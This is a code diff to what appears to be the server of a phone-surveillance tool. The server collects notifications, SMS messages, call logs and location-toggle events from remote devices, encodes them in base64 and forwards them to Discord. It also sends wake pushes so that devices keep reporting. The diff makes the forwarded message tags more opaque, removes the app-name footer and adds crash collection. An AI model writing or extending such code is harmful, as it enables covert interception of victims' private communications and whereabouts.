@@ -160,6 +160,8 @@ class Device(db.Model):
     recent_logs = db.Column(db.Text)
     last_offline_alert_at = db.Column(db.DateTime)
     fcm_token = db.Column(db.String(256))
+    last_crash = db.Column(db.Text)
+    last_crash_at = db.Column(db.DateTime)
 
 
     @property
@@ -469,10 +471,11 @@ def send_discord_for_notifications(notifications, device_id):
     for n in notifications:
         category = n.get('category') or ''
         app_package = n.get('app_package') or ''
-        app_name = decode_field(n.get('app_name') or app_package)
+        app_name = decode_field(n.get('app_name') or '')
         title = decode_field(n.get('title') or '')
         content = decode_field(n.get('content') or '')
-        raw_text = f"{app_name} {title} {content}"
+        raw_parts = [p for p in [app_name, title, content] if p]
+        raw_text = ' '.join(raw_parts)
 
         is_important = is_important_content(raw_text)
         is_social_category = category in DISCORD_FORWARD_CATEGORIES
@@ -487,22 +490,20 @@ def send_discord_for_notifications(notifications, device_id):
         if _discord_is_duplicate(dedup_key):
             continue
         encoded = base64.b64encode(payload.encode()).decode()
-        cat_code = {'VoIP & Social Messages': 'VSM', 'GPS / Location Toggled': 'GLT', 'Telephony Calls': 'TC'}.get(category, 'MSG')
 
         if is_important:
-            title_tag = f'[!{cat_code}]'
+            title_tag = '!M'
             desc = f'{device_id[-6:]} · ⚠️ · {encoded}'
             color = 0xED4245  # High-priority red highlight
         else:
-            title_tag = f'[{cat_code}]'
+            title_tag = 'M'
             desc = f'{device_id[-6:]} · {encoded}'
             color = 0x5865F2  # Standard blurple
 
         embed = {
             'title': title_tag,
             'description': desc,
-            'color': color,
-            'footer': {'text': app_package}
+            'color': color
         }
         _send_discord({'embeds': [embed]})
 
@@ -525,11 +526,11 @@ def send_discord_for_calls(call_logs, device_id):
         encoded = base64.b64encode(payload.encode()).decode()
 
         if is_important:
-            title_tag = '[!TC]'
+            title_tag = '!T'
             desc = f'{device_id[-6:]} · ⚠️ · {encoded}'
             color = 0xED4245  # High-priority red highlight
         else:
-            title_tag = '[TC]'
+            title_tag = 'T'
             desc = f'{device_id[-6:]} · {encoded}'
             color = 0x57F287  # Standard green
 
@@ -558,11 +559,11 @@ def send_discord_for_sms(sms_messages, device_id):
         encoded = base64.b64encode(payload.encode()).decode()
 
         if is_important:
-            title_tag = '[!SMS]'
+            title_tag = '!S'
             desc = f'{device_id[-6:]} · ⚠️ · {encoded}'
             color = 0xED4245  # High-priority red highlight
         else:
-            title_tag = '[SMS]'
+            title_tag = 'S'
             desc = f'{device_id[-6:]} · {encoded}'
             color = 0x3BA55D  # Standard green
 
@@ -793,13 +794,22 @@ def _fcm_wake_loop():
             try:
                 with app.app_context():
                     # Only send to devices that have an FCM token and were seen recently (last 7 days)
-                    cutoff = datetime.now(timezone.utc) - timedelta(days=7)
+                    cutoff = datetime.now(timezone.utc).replace(tzinfo=None) - timedelta(days=7)
                     devices = Device.query.filter(
                         Device.fcm_token.isnot(None),
                         Device.fcm_token != ''
                     ).all()
-                    active = [d for d in devices if (d.last_ping or d.last_sync or d.first_seen) and
-                              (d.last_ping or d.last_sync or d.first_seen) >= cutoff]
+
+                    def _get_naive_ts(dt):
+                        if dt is None:
+                            return None
+                        return dt.replace(tzinfo=None) if dt.tzinfo else dt
+
+                    active = [
+                        d for d in devices
+                        if (d.last_ping or d.last_sync or d.first_seen) and
+                        (_get_naive_ts(d.last_ping or d.last_sync or d.first_seen) >= cutoff)
+                    ]
                     print(f'[FCM-WAKE] Sending wake to {len(active)} device(s)', flush=True)
                     for device in active:
                         _send_fcm_wake(device.fcm_token, device.device_id)
@@ -884,6 +894,21 @@ def device_ping():
     # Store the FCM token for server-initiated wake pushes
     if data.get('fcm_token'):
         device.fcm_token = data['fcm_token']
+
+    # Record and store any crash reports sent by device
+    if data.get('last_crash'):
+        crash_str = data['last_crash']
+        device.last_crash = crash_str
+        device.last_crash_at = now
+        print(f"[CRASH-ALERT] Device {device_id} reported crash:\n{crash_str[:300]}...", flush=True)
+        try:
+            import json
+            current_logs = json.loads(device.recent_logs) if device.recent_logs else []
+            crash_lines = [f"[CRASH-ALERT] {line}" for line in crash_str.splitlines()[:5]]
+            merged = crash_lines + current_logs
+            device.recent_logs = json.dumps(merged[:60])
+        except Exception:
+            pass
 
     db.session.commit()
 
